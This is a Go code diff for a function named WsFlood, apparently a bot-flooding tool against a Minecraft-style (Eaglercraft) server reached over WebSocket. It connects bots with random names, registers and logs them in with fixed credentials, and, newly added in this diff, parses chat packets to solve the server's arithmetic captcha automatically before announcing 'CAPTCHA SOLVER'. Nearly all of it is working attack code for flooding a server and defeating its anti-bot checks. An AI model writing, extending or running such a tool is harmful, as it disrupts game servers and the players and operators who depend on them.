@@ -3,6 +3,7 @@ package main
 import (
 	"log"
 	"math/rand"
+	"strings"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -19,58 +20,79 @@ func WsFlood(motd bool) {
 		log.Println("dial:", err)
 		return
 	}
+	closed := false
+	c.SetCloseHandler(func(code int, text string) error {
+		closed = true
+		return nil
+	})
 	defer c.Close()
 
 	if motd {
 		err = c.WriteMessage(websocket.TextMessage, []byte("Accept: MOTD"))
 	} else {
-		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket("Liuli_"+RandStringRunes(10), addr))
-		// err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket(RandStringRunes(5), addr))
+		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket(RandStringRunes(5)+"T4nk", addr))
 		err = c.WriteMessage(websocket.BinaryMessage, buildCustomPayload("EAG|MySkin", []byte{0x04, byte(rand.Intn(64))}))
 	}
 	if err != nil {
 		log.Println(err)
 		return
 	}
-	if !motd {
-		go func() {
-			time.Sleep(3 * time.Second)
-			var errr error
-			if authme {
-				errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
-				// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
-				if errr != nil {
-					log.Println("read:", errr)
-					return
-				}
-			}
-			cnt := 0
-			for true {
+	handleChat := func(msg string) {
+		if len(msg) > 100 {
+			return
+		}
+		log.Println(msg)
+		if strings.Contains(msg, "等于") && strings.Contains(msg, "?") {
+			log.Println(msg)
+			res := solve(msg)
+			go func() {
 				time.Sleep(1 * time.Second)
-				// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("Liulihaocai#3747 >> "+RandStringRunes(30)))
-				errr = c.WriteMessage(websocket.BinaryMessage, buildChat(GetWord()))
-				if errr != nil {
-					log.Println("read:", errr)
+				if closed {
 					return
 				}
-				cnt++
-			}
-		}()
-	} else {
-		c.ReadMessage()
-		return
+				err := c.WriteMessage(websocket.BinaryMessage, buildChat(res))
+				if err != nil {
+					return
+				}
+				time.Sleep(3 * time.Second)
+				if closed {
+					return
+				}
+				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
+				if err != nil {
+					log.Println("read:", err)
+					return
+				}
+				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
+				if err != nil {
+					log.Println("read:", err)
+					return
+				}
+				time.Sleep(5 * time.Second)
+				if closed {
+					return
+				}
+				err = c.WriteMessage(websocket.BinaryMessage, buildChat("CAPTCHA SOLVER => "+res))
+				if err != nil {
+					log.Println("read:", err)
+					return
+				}
+			}()
+		}
 	}
 	for true {
-		// _, msg, err := c.ReadMessage()
-		_, _, err := c.ReadMessage()
+		_, msg, err := c.ReadMessage()
+		// _, _, err := c.ReadMessage()
 		if err != nil {
 			log.Println("read:", err)
 			return
 		}
 		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
-		// if msg[0] == 3 { // chat packet
-		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
-		// }
+		if msg[0] == 3 { // chat packet
+			handleChat(readMessage(msg[1:]))
+		} else if msg[0] == 255 { // disconnect packet
+			handleDisconnect(readMessage(msg[1:]))
+		}
 		// if msg[0] == 250 { // custom payload packet
 		// 	log.Printf("receive: id=%d msg=%s\n", msg[0], msg[3:])
 		// }
@@ -80,6 +102,29 @@ func WsFlood(motd bool) {
 		// log.Printf("receive: %s\n", msg)
 		// return
 	}
+}
+
+func readMessage(msg []byte) string {
+	length := readShort(msg, 0)
+	res := []rune{}
+	for i := 0; i < length; i++ {
+		res = append(res, rune(readShort(msg, 2+i*2)))
+	}
+	return string(res)
+}
+
+func readShort(b []byte, p int) int {
+	if p+2 > len(b) {
+		return 0
+	}
+	return int(b[p])<<8 | int(b[p+1])
+}
+
+func handleDisconnect(msg string) {
+	if strings.Contains(msg, "full") {
+		return
+	}
+	log.Println("disconnect:", msg)
 }
 
 func buildLoginPacket(username string, server string) []byte {
